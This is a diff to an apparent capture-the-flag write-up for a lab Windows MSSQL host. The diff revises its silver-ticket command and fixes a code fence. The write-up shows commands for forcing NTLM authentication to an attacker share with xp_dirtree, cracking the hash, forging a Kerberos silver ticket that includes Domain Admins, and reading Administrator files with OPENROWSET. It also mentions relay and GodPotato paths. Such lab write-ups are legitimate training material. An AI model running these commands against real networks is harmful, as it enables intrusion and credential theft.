@@ -15,7 +15,7 @@ tags: [windows, mssql, ntlm, kerberos, silver-ticket, openrowset, godpotato, pri
 
 ## TL;DR
 
-Start with local MSSQL credentials. `xp_dirtree` makes the service authenticate to an attacker share and `mssqlsvc`'s NetNTLMv2 hash cracks. With that account, forge a silver ticket including the IT group RID to become `sysadmin`; `OPENROWSET(BULK ...)` reads files as Administrator and PowerShell history reveals the password. There are also NTLM relay and `SeImpersonatePrivilege` token recovery paths.
+Start with local MSSQL credentials. `xp_dirtree` makes the service authenticate to an attacker share and `mssqlsvc`'s NetNTLMv2 hash cracks. With that account, forge a silver ticket including `mssqlsvc`'s RID and the IT and Domain Admins groups to become `sysadmin`; `OPENROWSET(BULK ...)` reads files as Administrator and PowerShell history reveals the password. There are also NTLM relay and `SeImpersonatePrivilege` token recovery paths.
 
 ## Recon
 
@@ -41,13 +41,14 @@ SQL> xp_dirtree \\<ATTACKER>\share
 hashcat -m 5600 mssqlsvc.hash rockyou.txt
 # silver ticket
 ticketer.py -nthash <HASH> -domain-sid <SID> -domain signed.htb \
-  -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
+  -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' Administrator
 KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
-SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;```
+SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
+```
 
 ## Lateral movement
 
-With `mssqlsvc`'s NTLM hash, forge a silver ticket for `MSSQLSvc/DC01.signed.htb:1433` and add RID 1105 (IT). The ticket grants `sysadmin`; `OPENROWSET(BULK ...)` reads files with the ticket's groups, including Administrator's PowerShell history.
+With `mssqlsvc`'s NTLM hash, forge a silver ticket for `MSSQLSvc/DC01.signed.htb:1433` and add RID 1103 (`mssqlsvc`) and groups 1105 (IT) and 512 (Domain Admins). The ticket grants `sysadmin`; `OPENROWSET(BULK ...)` reads files with the ticket's groups, including Administrator's PowerShell history.
 
 ## Privilege escalation
 
@@ -56,7 +57,7 @@ The history contains the password used to reset Administrator. Alternatively, cr
 ## Evidence
 
 - `xp_dirtree` and `mssqlsvc` hash.
-- IT RIDs and `sysadmin` silver ticket.
+- Service RID, 512/1105 groups and `sysadmin` silver ticket.
 - `OPENROWSET` read and PowerShell history.
 - Alternate relay and GodPotato paths.
 
